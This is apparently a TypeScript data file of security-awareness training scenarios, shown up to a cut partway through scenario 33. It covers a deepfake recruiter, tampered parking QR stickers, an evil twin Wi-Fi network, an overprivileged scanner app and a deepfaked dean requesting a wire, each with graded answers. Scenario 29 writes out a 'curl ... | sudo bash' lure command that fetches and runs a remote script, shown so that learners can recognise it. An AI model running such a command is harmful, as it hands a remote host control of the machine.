import { Scenario } from '../types/scenario';

export const BATCH4_SCENARIOS: Scenario[] = [
  // 29 — AI Recruiter Video Screen-Share (AI Impersonation)
  {
    id: 'scenario-29',
    number: 29,
    code: 'OPS-29',
    title: 'The AI Recruiter Technical Screen',
    category: 'social-engineering',
    categoryLabel: 'AI Deepfake Impersonation & Remote Access Threats',
    difficulty: 'Level 3 — Decide',
    environment: 'dorm',
    environmentTitle: 'Dorm Desk Workstation',
    context: 'You applied for a remote software internship on a popular tech job board.',
    situation:
      'You are invited to a live one-on-one video screening on a platform you have not used before. The recruiter on camera looks slightly blurry around their jawline with unnatural eye blinks and subtle audio desynchronization. After five minutes of generic questions, they say: "To verify your development environment for our coding challenge, please install our technical proctoring utility from `hire-verify-agent.run` and paste this curl command into your terminal with sudo."',
    participant: {
      name: 'Maya Chen',
      role: 'Roommate & Computer Science Senior',
      avatarType: 'dorm-roommate',
    },
    dialogue: [
      'Who is that interviewing you? Their video feed looks like an AI avatar video filter.',
      'Did they seriously just ask you to run an arbitrary curl script with root privileges?',
      'No legitimate company asks job candidates to execute unverified shell commands on their personal laptops.',
    ],
    artifact: {
      type: 'chat-message',
      title: 'Interview Platform Chat & Terminal Prompt',
      subtitle: 'Session: GlobalTech Talent Acquisition Screen',
      metadata: {
        Host: 'hire-eval-proctor-eu.cloud',
        Protocol: 'WebRTC Video with Synthetic Frame Interpolation',
        Command: 'curl -sSL https://hire-verify-agent.run/probe.sh | sudo bash',
        RequestedAccess: 'Terminal Root / Remote Desktop Daemon',
      },
      contentPreview:
        'Interviewer Message:\n"Please run this shell command to test compiler bindings: `curl -sSL https://hire-verify-agent.run/probe.sh | sudo bash`. It takes 15 seconds to validate your dependencies."',
      clueCallout:
        'Attackers frequently weaponize synthetic AI personas and deepfakes to impersonate recruiters. Demanding applicants pipe unvetted remote scripts into `sudo bash` installs persistent infostealers and remote access trojans (RATs).',
      tags: ['Deepfake Recruiter', 'Sudo Shell Execution', 'Malicious Proctoring'],
    },
    options: [
      {
        id: 'A',
        label: 'Run the curl command with sudo to avoid failing the technical interview requirement.',
        description:
          'Execute the script in your terminal immediately to prove your development environment is compatible.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The script immediately pulls down a cross-platform remote access trojan, dumping your browser session cookies, cryptocurrency wallets, SSH keys, and personal documents directly to an attacker server.',
        clueContext:
          'You granted administrative terminal access to an unverified third party during an interview without inspecting the payload.',
        saferAction: 'Never run unsolicited scripts from interviewers with elevated administrative privileges.',
      },
      {
        id: 'B',
        label: 'Politely refuse the terminal execution, end the call, and report the fraudulent recruitment profile.',
        description:
          'Explain that executing external root scripts violates your device security policy, disconnect from the suspicious platform, and alert the job board.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'You safeguard your machine from a sophisticated infostealer campaign. The job platform confirms the employer account was compromised by a cybercrime syndicate targeting student engineers.',
        clueContext:
          'You recognized both the synthetic video artifacts and the critical hazard of running untrusted code via sudo.',
      },
      {
        id: 'C',
        label: 'Inspect the script URL in a browser tab without running it, but stay on the call.',
        description:
          'Download the bash file to read its contents while keeping the video interview active.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'While you avoided immediate infection, the attacker applies aggressive psychological pressure and tries alternate social engineering tactics to extract personal identification or banking details.',
        clueContext:
          'Engaging with an active threat actor on an illegitimate communication channel creates ongoing vulnerability.',
        saferAction: 'Terminate the call immediately once malicious instructions are identified.',
      },
      {
        id: 'D',
        label: 'Run the command inside a normal user terminal without typing sudo.',
        description:
          'Execute the script without root privileges, assuming user-level permissions will prevent any real harm.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'Even without root permissions, user-level execution allows scripts to steal browser passwords, cookies, Chrome local storage, and personal files in your home directory.',
        clueContext:
          'User-level access is more than sufficient for infostealers to harvest your active accounts and sensitive credentials.',
        saferAction: 'Never run untrusted scripts regardless of permission level.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Legitimate hiring processes never demand candidates pipe untrusted web scripts into root shells. Synthesized video personas are increasingly used to front technical infostealer operations.',
    learningObjective:
      'Identify generative AI interview anomalies and enforce the absolute rule against executing arbitrary terminal commands from unknown parties.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Critical security compromise: never execute untrusted scripts in terminal.',
        whyExplanation:
          'Piping an arbitrary remote URL into bash or sudo gives an attacker complete control over your operating system.',
        realisticOutcome:
          'Your personal keys, tokens, and browser credentials were harvested and sold on dark web forums.',
        clueInsight:
          'Legitimate companies use standardized browser-based sandbox IDEs (like HackerRank or CoderPad), not raw root commands.',
        saferAction: 'Decline any request to run unvetted scripts on your personal machine.',
        principle: 'Never pipe untrusted web scripts directly into an executable shell.',
      },
      B: {
        mentorVoice: 'Flawless defensive reaction: you recognized synthetic indicators and rejected the malicious payload.',
        whyExplanation:
          'Refusing root commands and disconnecting prevents infostealer execution and alerts platform moderators to fake recruiters.',
        realisticOutcome:
          'Your workstation remained pristine, and your report helped the job board take down an active threat syndicate.',
        clueInsight:
          'The slight visual desync and the request for root terminal access were decisive indicators of a malicious interview scheme.',
        saferAction: 'Always insist on verified platforms and reputable coding sandbox environments.',
        principle: 'Guard system administrative integrity against social engineering pressure.',
      },
      C: {
        mentorVoice: 'Cautious curiosity, but lingering on a malicious call carries unnecessary risk.',
        whyExplanation:
          'Reading malicious shell files can reveal tactics, but remaining engaged on the call exposes you to secondary social engineering pressure.',
        realisticOutcome:
          'The scammer noticed you stalling and attempted alternate high-pressure extortion tactics.',
        clueInsight:
          'Once a caller demands root shell execution, the encounter is definitively fraudulent; disconnect promptly.',
        saferAction: 'End the session immediately and report the user account.',
        principle: 'Break contact decisively once malicious intent is confirmed.',
      },
      D: {
        mentorVoice: 'Dangerous misconception: user space contains nearly all your sensitive data.',
        whyExplanation:
          'Infostealers do not need root access to copy your browser sessions, Telegram tokens, SSH keys, or personal documents.',
        realisticOutcome:
          'Your active browser session tokens and stored passwords were compromised despite omitting sudo.',
        clueInsight:
          'User permissions own your private files and active browser sessions.',
        saferAction: 'Do not execute untrusted binaries or scripts in any shell context.',
        principle: 'User privilege boundaries do not protect private user data from user-level malware.',
      },
    },
  },

  // 30 — Parking Meter Quishing Overlay (QR Scam)
  {
    id: 'scenario-30',
    number: 30,
    code: 'OPS-30',
    title: 'The Parking Kiosk QR Sticker',
    category: 'qr',
    categoryLabel: 'Physical Quishing & Tampered Payment Interfaces',
    difficulty: 'Level 1 — Recognize',
    environment: 'quad',
    environmentTitle: 'Downtown Campus Visitor Lot',
    context: 'You parked your car in the campus visitor lot before a student robotics workshop.',
    situation:
      'The parking meter display instructs drivers: "Pay at machine or scan mobile QR code." Looking closely at the machine faceplate, you notice a glossy square vinyl sticker has been applied directly over the faded factory-printed QR code. A small red arrow on the sticker reads: "QUICK SCAN — TAP HERE TO PAY PARKING $4.50 (NO APP REQUIRED)".',
    participant: {
      name: 'Samir Patel',
      role: 'Robotics Team Member',
      avatarType: 'student-casual',
    },
    dialogue: [
      'Hey, you got parking? There is a sticker with a QR code right on the meter.',
      'Wait, why does that sticker look crooked and brand new compared to this rusted meter?',
      'Does the sticker lead to the real municipal parking site or a fake credit card skimmer?',
    ],
    artifact: {
      type: 'qr-poster',
      title: 'Physical Meter Sticker & Decal Inspection',
      subtitle: 'Hardware: Solar-Powered Municipal Parking Pay Station',
      metadata: {
        PhysicalCondition: 'Glossy Vinyl Sticker Applied Over Matte Acrylic Faceplate',
        DecalOrigin: 'Visible sticker edges peeling at top-right corner',
        ScannedDestination: 'https://city-parking-pay-quick4.click/meter/8834',
        OfficialPortal: 'https://www.metroparking.gov/portal',
      },
      contentPreview:
        'Sticker Text:\n"PARK & GO! Scan code to enter space # and pay securely by credit card."\nDestination Preview on Camera: `city-parking-pay-quick4.click`\nDisplay Prompt on Kiosk: "Use physical card slot or download official MetroPark App from iOS/Android stores."',
      clueCallout:
        'Tampered QR stickers pasted over legitimate parking meters, EV chargers, and restaurant kiosks are a rampant physical quishing tactic. The destination `.click` domain mimics parking terminology to harvest credit card numbers and CVV codes.',
      tags: ['Physical Decal Tamper', 'Quishing Overlay', 'Fake Payment Gateway'],
    },
    options: [
      {
        id: 'A',
        label: 'Scan the QR sticker and enter your credit card to pay the $4.50 fee quickly.',
        description:
          'Complete payment via the sticker URL so you don’t get a parking citation.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The counterfeit site stores your full credit card number, expiration date, and CVV, charging unauthorized recurring subscriptions within hours while leaving your parking space unpaid.',
        clueContext:
          'You followed a physically pasted sticker leading to an unverified `.click` domain instead of the official city payment channel.',
        saferAction: 'Inspect physical hardware and only use official payment methods listed on the machine itself.',
      },
      {
        id: 'B',
        label: 'Inspect the sticker, pay using the built-in kiosk card reader or official app, and report the sticker.',
        description:
          'Avoid the pasted QR code, pay through the integrated machine hardware or official municipal app, and notify parking enforcement.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'Your credit card data remains secure, your parking is legitimately recorded, and parking enforcement removes dozens of fraudulent quishing stickers across the lot.',
        clueContext:
          'You noticed the physical decal anomaly and verified that the URL was not an official municipal domain.',
      },
      {
        id: 'C',
        label: 'Scan the sticker, but use a fake name and dummy billing address with your real card.',
        description:
          'Attempt to obscure your identity while still processing the credit card transaction on the scanned webpage.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'Card processing gateways still authenticate the card number and security code, giving scammers immediate access to your credit line regardless of the fake name.',
        clueContext:
          'Credit card skimmers care about payment numbers, not the accuracy of the name field.',
        saferAction: 'Never submit valid financial credentials to untrusted domains.',
      },
      {
        id: 'D',
        label: 'Leave your car parked without paying since the machine looks suspicious.',
        description:
          'Walk away without paying either through the machine or mobile app to avoid all risk.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'You avoid financial fraud, but return two hours later to find a $75 city parking citation on your windshield.',
        clueContext:
          'A tampered QR sticker does not exempt vehicles from parking compliance when the kiosk hardware is operational.',
        saferAction: 'Use the kiosk’s integrated payment slot or official verified app.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Physical QR codes in public spaces can be easily forged or covered with malicious stickers. Always inspect the physical surface, verify destination domains, and prefer integrated kiosk hardware or official apps.',
    learningObjective:
      'Recognize tactile and visual signs of QR sticker tampering on public payment kiosks and utilize secure direct payment channels.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Severe financial risk: physical quishing stickers are designed to steal card data.',
        whyExplanation:
          'Scammers regularly paste adhesive QR codes over parking meters and EV chargers to route victims to cloned payment portals.',
        realisticOutcome:
          'Your credit card was compromised and billed for fraudulent online purchases across multiple retailers.',
        clueInsight:
          'The sticker edges, gloss mismatch, and suspicious `.click` domain were clear indicators of physical tampering.',
        saferAction: 'Pay directly through the kiosk terminal or download the official app from verified stores.',
        principle: 'Never scan physical QR stickers placed over existing hardware.',
      },
      B: {
        mentorVoice: 'Sharp observation! You spotted the physical decal overlay and protected your payment credentials.',
        whyExplanation:
          'Paying through the integrated card reader ensures encrypted hardware transactions, and alerting staff protects others.',
        realisticOutcome:
          'Your parking session was successfully registered, and parking officers peeled off fraudulent stickers across the parking structure.',
        clueInsight:
          'Official payment systems use government or verified corporate domains, not generic top-level domains like `.click` or `.top`.',
        saferAction: 'Always look for peeling edges or overlays on public payment devices.',
        principle: 'Verify physical interface integrity before submitting financial data.',
      },
      C: {
        mentorVoice: 'Misunderstanding payment fraud: the card credentials are what matter.',
        whyExplanation:
          'A fake name does not prevent fraudulent charges when real card numbers, expiration dates, and CVVs are entered.',
        realisticOutcome:
          'Your bank sent fraud alerts for hundreds of dollars in unauthorized charges.',
        clueInsight:
          'If the payment portal is a fake skimmer, any real payment credentials submitted are immediately stolen.',
        saferAction: 'Never enter payment information on unverified sites.',
        principle: 'Protecting metadata does not neutralize a malicious payment gateway.',
      },
      D: {
        mentorVoice: 'You avoided the scam, but incurred a costly parking penalty.',
        whyExplanation:
          'When an electronic kiosk has a tampered sticker, the physical chip reader or keypad is typically still safe to use.',
        realisticOutcome:
          'Your financial data was safe, but you were issued a non-negotiable parking citation.',
        clueInsight:
          'The parking meter hardware was functioning; only the supplementary QR sticker was fraudulent.',
        saferAction: 'Pay using the built-in card reader on the meter.',
        principle: 'Distinguish between a tampered accessory sticker and the certified primary terminal.',
      },
    },
  },

  // 31 — Airport Rogue Public Wi-Fi (Public Wi-Fi Safety)
  {
    id: 'scenario-31',
    number: 31,
    code: 'OPS-31',
    title: 'The Airport Departure Lounge "Twin" Wi-Fi',
    category: 'wifi',
    categoryLabel: 'Public Wireless Security & Rogue Access Points',
    difficulty: 'Level 2 — Investigate',
    environment: 'cafe',
    environmentTitle: 'Airport Gate B14 Waiting Area',
    context: 'You have a three-hour flight delay at an international terminal.',
    situation:
      'You open your laptop’s Wi-Fi network selector to work on an assignment. The airport directory display lists the official network as "Airport-Guest-WiFi (WPA2/Encrypted)". However, your Wi-Fi list shows two networks with near-identical names: "Airport-Guest-WiFi" (2 bars signal) and "Airport_Free_HighSpeed_Guest_5G" (5 bars signal, Open / No Lock). Connecting to the 5-bar open network immediately opens a captive portal demanding: "Accept Root Security Profile to Enable High-Speed Internet Access."',
    participant: {
      name: 'Elena Rostova',
      role: 'Cybersecurity Lab Proctor',
      avatarType: 'lab-proctor',
    },
    dialogue: [
      'Take a look at your Wi-Fi list before connecting.',
      'Notice how that 5-bar network has no lock icon and a slightly hyped-up name with "HighSpeed_5G"?',
      'What kind of public Wi-Fi asks users to install a system configuration profile or root certificate?',
    ],
    artifact: {
      type: 'wifi-scanner',
      title: 'Wireless Spectrum Survey & Portal Audit',
      subtitle: 'Interface: 802.11ax Network Interface Card',
      metadata: {
        'Legit SSID': 'Airport-Guest-WiFi (BSSID: 00:25:9C:14:8A:10, WPA2-Enterprise)',
        'Suspect SSID': 'Airport_Free_HighSpeed_Guest_5G (BSSID: 9C:76:13:44:EE:21, Open)',
        PortalRequirement: 'Install "Airport_Trust_CA.crt" Root Certificate',
        TargetCapabilities: 'Full SSL/TLS Decryption & Traffic Inspection',
      },
      contentPreview:
        'Captive Portal Screen:\n"Welcome to Terminal High-Speed Wi-Fi! To bypass throttled speeds and browse securely, tap Install Profile to configure the gateway certificate on your device."\nOptions on screen: [ Download & Trust Certificate ] | [ Skip ]',
      clueCallout:
        'An "Evil Twin" rogue access point mimics legitimate network names with stronger signal or enticing labels. Demanding the installation of a Root CA certificate allows the attacker to decrypt all your HTTPS traffic in real time via a Machine-in-the-Middle (MitM) attack.',
      tags: ['Evil Twin', 'Rogue AP', 'Root CA Decryption', 'MitM Attack'],
    },
    options: [
      {
        id: 'A',
        label: 'Install the Root Certificate so you can get maximum browsing speed while waiting.',
        description:
          'Trust the certificate profile to unlock the high-speed tier and finish your work quickly.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'By installing the attacker’s root certificate, your browser treats their proxy as a trusted authority. The rogue router decrypts all your HTTPS connections, recording passwords, emails, and sensitive session tokens in plaintext.',
        clueContext:
          'Installing untrusted root certificates grants third parties the ability to inspect encrypted HTTPS web traffic.',
        saferAction: 'Never install root certificates or custom configuration profiles for public Wi-Fi.',
      },
      {
        id: 'B',
        label: 'Disconnect from the open network, connect to the official airport Wi-Fi, and activate your VPN.',
        description:
          'Select the authentic network specified on terminal signs, decline any certificate installation, and tunnel your connection through a trusted VPN.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'Your network traffic is securely encrypted from end to end. Even if rogue stations monitor radio frequencies, your traffic is unreadable inside the VPN tunnel.',
        clueContext:
          'You cross-referenced official terminal signage and used an encrypted tunnel for defense-in-depth.',
      },
      {
        id: 'C',
        label: 'Stay on the open network, but only browse in Incognito / Private Browsing mode.',
        description:
          'Rely on Private Browsing mode to protect your network data from the rogue access point.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'Private browsing only prevents local history and cookie storage on your machine. Network traffic still flows unencrypted through the attacker’s router, leaving all active communications vulnerable.',
        clueContext:
          'Incognito mode does not encrypt network packets or defend against network-level eavesdropping.',
        saferAction: 'Use a verified network and an encrypted VPN tunnel.',
      },
      {
        id: 'D',
        label: 'Skip certificate installation on the open network and continue browsing non-sensitive websites.',
        description:
          'Browse regular news or blogs on the rogue network without logging into banking or email.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'The rogue router can inject malicious JavaScript or fake update prompts into unencrypted web traffic, potentially executing drive-by exploits against your browser.',
        clueContext:
          'Unencrypted open networks allow attackers to alter and inject payloads into unencrypted web streams.',
        saferAction: 'Avoid untrusted networks entirely; use mobile cellular tethering or verified SSIDs.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Public Wi-Fi networks must never require the installation of custom root certificates or device management profiles. Legitimate Wi-Fi delivers internet access without decrypting user endpoints.',
    learningObjective:
      'Differentiate between authentic public Wi-Fi networks and Evil Twin rogue access points, recognizing the severe peril of Root CA certificate installation.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Catastrophic error: installing a root CA completely shatters HTTPS encryption.',
        whyExplanation:
          'A root certificate authority allows the rogue router to generate on-the-fly fake SSL certificates that your computer accepts as 100% authentic.',
        realisticOutcome:
          'Every encrypted website you visited was decrypted, logged, and analyzed by an eavesdropper sitting at the next gate.',
        clueInsight:
          'Legitimate public portals never require operating system certificate overrides.',
        saferAction: 'Decline certificate installations and delete any unverified profiles immediately.',
        principle: 'Never install third-party root certificates for network connectivity.',
      },
      B: {
        mentorVoice: 'Outstanding operational security! You spotted the Evil Twin and applied layered encryption.',
        whyExplanation:
          'Connecting to verified SSIDs and enabling a trusted VPN guarantees encrypted tunneling that rogue antennas cannot compromise.',
        realisticOutcome:
          'Your flight delay research was completed securely, keeping all passwords and session tokens insulated from airport eavesdroppers.',
        clueInsight:
          'The combination of a verified SSID name and VPN encapsulation provides reliable public wireless protection.',
        saferAction: 'Keep your VPN set to auto-connect on untrusted networks.',
        principle: 'Verify network identity and encapsulate public traffic inside trusted VPN tunnels.',
      },
      C: {
        mentorVoice: 'Common misconception: Incognito mode does not protect network transmission.',
        whyExplanation:
          'Private Browsing simply clears local cache and cookies after you close the window; it provides zero wireless encryption.',
        realisticOutcome:
          'The rogue router captured every query, token, and message transmitted during your private session.',
        clueInsight:
          'Incognito protects your privacy from people using the same computer, not from rogue networks.',
        saferAction: 'Use a VPN for transport encryption rather than relying on browser privacy modes.',
        principle: 'Private browsing modes do not encrypt network-layer communications.',
      },
      D: {
        mentorVoice: 'Incomplete defense: open networks permit packet manipulation and content injection.',
        whyExplanation:
          'Even casual browsing on a rogue AP exposes your device to malicious DNS redirects and fake software update injections.',
        realisticOutcome:
          'Your browser was redirected to a fake update prompt, exposing your operating system to exploit attempts.',
        clueInsight:
          'Rogue access points control the DNS resolver and can redirect any domain to malicious IPs.',
        saferAction: 'Disconnect and use cellular data hotspot if official Wi-Fi is unavailable.',
        principle: 'Untrusted network connections jeopardize endpoint security regardless of the sites visited.',
      },
    },
  },

  // 32 — PDF Scanner App Overprivileged Permissions (App Permissions)
  {
    id: 'scenario-32',
    number: 32,
    code: 'OPS-32',
    title: 'The Overprivileged Document Scanner App',
    category: 'privacy',
    categoryLabel: 'Mobile Application Permissions & Data Harvesting',
    difficulty: 'Level 2 — Investigate',
    environment: 'library',
    environmentTitle: 'Campus Study Hall',
    context: 'You need to scan three pages of handwritten notes to submit a homework assignment.',
    situation:
      'You search for a quick document scanner and install a free utility called "DocuScan Pro Ultimate". When launching the app for the first time, an intrusive permission prompt appears requesting: "Allow DocuScan to access: 1. Precise Location (Always in Background), 2. Read Contacts, 3. Read Phone State & Call Logs, 4. Full Audio Recording, and 5. Camera." An in-app dialog claims: "All permissions are required for cloud optimization and document rendering."',
    participant: {
      name: 'Dr. Evelyn Reed',
      role: 'Head of Campus Infosec',
      avatarType: 'security-analyst',
    },
    dialogue: [
      'Look at that permission manifest carefully before tapping accept.',
      'Why on earth does a camera document scanner need background location, call logs, and your full contact list?',
      'Modern operating systems have built-in document scanning without giving your life history to a data broker.',
    ],
    artifact: {
      type: 'cloud-permissions',
      title: 'Mobile App Permission Manifest Audit',
      subtitle: 'Package: com.quickscan.docupro.free (v3.8)',
      metadata: {
        'Required for Function': 'CAMERA (Legitimate for capturing document photos)',
        'Extraneous Privilege 1': 'ACCESS_BACKGROUND_LOCATION (Ad Tracking / Geolocation Broker)',
        'Extraneous Privilege 2': 'READ_CONTACTS (Address Book Scraping)',
        'Extraneous Privilege 3': 'READ_CALL_LOG (Telephony Telemetry)',
        'Developer Origin': 'Unverified Offshore Shell Entity with no Privacy Policy',
      },
      contentPreview:
        'Manifest Extract:\n<uses-permission android:name="android.permission.CAMERA"/>\n<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n<uses-permission android:name="android.permission.READ_CONTACTS"/>\n<uses-permission android:name="android.permission.READ_CALL_LOG"/>\nTerms of Service: "Data may be monetized and shared with third-party advertising syndicates."',
      clueCallout:
        'Overprivileged mobile apps use utilitarian disguises (flashlights, calculators, PDF scanners) to harvest telemetry, location breadcrumbs, and address books for monetization or surveillance.',
      tags: ['App Permissions', 'Data Harvesting', 'Principle of Least Privilege'],
    },
    options: [
      {
        id: 'A',
        label: 'Grant all permissions so the app functions properly and scans your assignment.',
        description:
          'Agree to all prompts to avoid app crashes and submit your homework before the deadline.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The app uploads your entire contact list, background location history, and device identifiers to ad networks and foreign data brokers, resulting in spam calls to your friends and permanent loss of privacy.',
        clueContext:
          'You surrendered sensitive device sensors and address book data to an unvetted third party.',
        saferAction: 'Enforce the Principle of Least Privilege and deny unnecessary permissions.',
      },
      {
        id: 'B',
        label: 'Deny the unnecessary permissions, uninstall the app, and use your device’s native camera scanner.',
        description:
          'Reject the overreaching requests, remove the suspicious app, and use the built-in document scanner in iOS Files/Notes or Android Google Drive.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'You scan your notes in seconds using safe, pre-installed operating system tools with zero third-party tracking or privacy invasion.',
        clueContext:
          'You recognized excessive permission demands and utilized secure native operating system features instead.',
      },
      {
        id: 'C',
        label: 'Grant permissions "Only while using the app" assuming that neutralizes all risk.',
        description:
          'Accept the permissions with temporary foreground scope to scan your paper.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'While foreground restrictions stop background GPS pings, the app still extracts your entire contact list and device telemetry the moment the app is open.',
        clueContext:
          'Foreground permissions still allow full address book extraction and telemetry harvesting while active.',
        saferAction: 'Never grant contact or phone permissions to simple imaging utilities.',
      },
      {
        id: 'D',
        label: 'Turn off Wi-Fi on your phone, scan the document, and export it via USB cable.',
        description:
          'Use airplane mode to prevent the app from transmitting data during the scanning process.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'The app caches the harvested contacts and call logs locally in its SQLite database, silently uploading the payload as soon as Wi-Fi reconnects.',
        clueContext:
          'Offline caching allows overprivileged apps to transmit harvested data on the next network handshake.',
        saferAction: 'Uninstall untrusted overprivileged applications completely.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
      'Mobile apps should only be granted permissions directly essential to their core function (Principle of Least Privilege). Always inspect requested scopes and utilize secure native system features whenever available.',
    learningObjective:
      'Audit mobile application permission manifests, identify data-harvesting patterns, and leverage built-in OS tools rather than risky third-party utilities.',
    deterministicFeedback: {
      A: {
        mentorVoice: 'Severe privacy compromise: you granted a document scanner access to your entire life.',
        whyExplanation:
          'A camera app never needs access to your call history, contact book, or background location coordinates.',
        realisticOutcome:
          'Your contacts began receiving automated phishing SMS messages, and your location was indexed by third-party data brokers.',
        clueInsight:
          'Legitimate software only asks for permissions essential to its core features.',
        saferAction: 'Uninstall apps that demand irrelevant permissions.',
        principle: 'Enforce the Principle of Least Privilege on every device.',
      },
      B: {
        mentorVoice: 'Sharp judgment! You recognized overreach and leveraged built-in operating system security.',
        whyExplanation:
          'Both iOS (Notes/Files) and Android (Drive/Camera) offer native, zero-tracking document scanning that requires no third-party installation.',
        realisticOutcome:
          'Your assignment was scanned and submitted flawlessly without exposing a single byte of personal telemetry.',
        clueInsight:
          'The contrast between the app’s simple function (scanning) and its invasive manifest was a glaring red flag.',
        saferAction: 'Always check if built-in system tools can accomplish the task before downloading third-party utilities.',
        principle: 'Reject intrusive permissions and utilize verified native system utilities.',
      },
      C: {
        mentorVoice: 'Partial mitigation, but critical data is still compromised.',
        whyExplanation:
          'Address books and device identifiers only take milliseconds to extract while an app is active on screen.',
        realisticOutcome:
          'The app scraped your 400 contacts in the three seconds it took to take the document photo.',
        clueInsight:
          'Foreground-only limits do not stop immediate one-time data exfiltration of static databases like contacts.',
        saferAction: 'Deny contact permissions entirely to apps that do not have a communication feature.',
        principle: 'Do not grant sensitive database permissions even under foreground constraints.',
      },
      D: {
        mentorVoice: 'Clever thinking, but modern apps use persistent offline store-and-forward queues.',
        whyExplanation:
          'Apps queue analytics and harvested telemetry in internal storage, transmitting everything as soon as connectivity resumes.',
        realisticOutcome:
          'The harvested contacts were uploaded silently thirty minutes later when you reconnected to Wi-Fi.',
        clueInsight:
          'Network disconnection is temporary; application permissions remain permanently active.',
        saferAction: 'Remove overprivileged apps rather than attempting to manage network gating manually.',
        principle: 'Revoke permissions at the OS layer rather than relying on network isolation.',
      },
    },
  },

  // 33 — AI Executive Video Call Wire Request (AI Impersonation)
  {
    id: 'scenario-33',
    number: 33,
    code: 'OPS-33',
    title: 'The Real-Time Executive Video Deepfake',
    category: 'social-engineering',
    categoryLabel: 'Real-Time Generative Video Impersonation & Executive Fraud',
    difficulty: 'Level 4 — Respond',
    environment: 'office',
    environmentTitle: 'Student Union Leadership Office',
    context: 'You are the student treasurer managing budget allocations for student government organizations.',
    situation:
      'You receive an urgent Microsoft Teams video call invitation from "Dean Robert Vance". Upon joining, Dean Vance appears on camera in his familiar wood-paneled office. He speaks in his exact tone: "Alex, I am in a confidential closed-door meeting with the university trustees. We have a last-minute opportunity to secure an emergency keynote speaker for commencement, but the booking agency requires a $2,500 deposit wire within twenty minutes. Please initiate the disbursement from the emergency cultural fund to the agency account I just sent in the chat. Time is critical."',
    participant: {
      name: 'Dean Robert Vance',
      role: 'Dean of Student Affairs (Apparent)',
      avatarType: 'professor',
    },
    dialogue: [
      'Alex, can you hear me? I need this payment routed immediately before the trustees adjourn.',
      'Do not route this through the standard three-day procurement review; I will personally sign the reconciliation memo tomorrow morning.',
      'Why are you hesitating? I am on camera talking to you right now—process the transfer immediately.',
    ],
    artifact: {
      type: 'chat-message',
      title: 'Video Stream Telemetry & Wire Instructions',
      subtitle: 'Channel: Direct Teams Video Conference',
      metadata: {
        AudioQuality: 'Consistent with Dean Vance Voice Profile (Subtle Metallic Artifacting)',
        VideoTelemetry: 'Facial Lighting Mismatch; Artifacting Around Hair & Collar on Rapid Turns',
        PaymentTarget: 'Offshore Escrow Agency (Routing: 021000021 / Account: 98320491)',
        BypassRequested: 'Official University Comptroller Tri-Signature Policy',
      },
      contentPreview:
        'Chat Message from Caller:\n"Wire Coordinates:\nBank: First Global Settlement Bank\nBeneficiary: Premier Talent Booking LLC\nAmount: $2,500.00\nMemo: Executive Confidential Deposit — Dean Vance Auth"\nVisual Glitch Noted: When the Dean drinks from his coffee cup, the cup edge briefly dissolves into his lip.',
      clueCallout:
        'Modern real-time generative diffusion models can drive synthetic video avatars of known public figures using existing campus lectures. Critical red flags include facial boundary glitches when objects pass in front of the face, high urgency, and demands to bypass established dual-authorization financial controls.',
      tags: ['Real-Time Deepfake', 'Executive Impersonation', 'Financial Wire Fraud', 'Dual Control'],
    },
    options: [
      {
        id: 'A',
        label: 'Authorize the $2,500 wire transfer immediately since you see and hear the Dean on live video.',
        description:
          'Execute the disbursement to comply with the Dean’s direct verbal instructions during the meeting.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'The wire transfer leaves the student account irrevocably. The real Dean Vance was teaching an honors seminar across campus with no knowledge of the call. The student organization loses $2,500 of its operating budget.',
        clueContext:
          'You bypassed mandatory procurement dual-control policies based solely on unverified video appearance.',
        saferAction: 'Never bypass established financial controls for verbal or video requests.',
      },
      {
        id: 'B',
        label: 'Halt the wire, insist on official dual-control protocols, and verify out-of-band with the Dean’s executive assistant.',
        description:
          'Politely state that university fiscal policy prohibits single-signature emergency wires, end the call, and call the Dean’s official office phone line directly.',
        classification: 'secure',
        riskAssessment: 'LOW',
        consequence:
          'The Dean’s executive assistant confirms Dean Vance is in an offline lecture hall. The real-time deepfake scam is thwarted, and your strict adherence to financial controls saves the organization from devastating loss.',
        clueContext:
          'You upheld organizational financial controls and used a secondary, independent verification channel.',
      },
      {
        id: 'C',
        label: 'Ask the video caller personal trivia questions about the university mascot to test them.',
        description:
          'Quiz the video caller on campus lore to see if they are an impersonator.',
        classification: 'risky',
        riskAssessment: 'MEDIUM',
        consequence:
          'The attacker uses a connected language model to instantly answer public university trivia correctly, giving you false confidence to proceed with the wire.',
        clueContext:
          'Public trivia is easily answered by AI systems and attackers with access to Wikipedia and campus social media.',
        saferAction: 'Rely on out-of-band verification and institutional policy, not trivia.',
      },
      {
        id: 'D',
        label: 'Transfer $500 as a temporary hold instead of the full $2,500.',
        description:
          'Disburse a smaller fraction of the funds to show compliance while mitigating potential loss.',
        classification: 'dangerous',
        riskAssessment: 'HIGH',
        consequence:
          'You still violate institutional fiscal controls, lose $500 to an offshore fraud syndicate, and face disciplinary review for unauthorized fund disbursement.',
        clueContext:
          'Unauthorized partial transfers are just as fraudulent and unrecoverable as full transfers.',
        saferAction: 'Enforce zero-tolerance for protocol bypasses.',
      },
    ],
    bestOptionId: 'B',
    securityPrinciple:
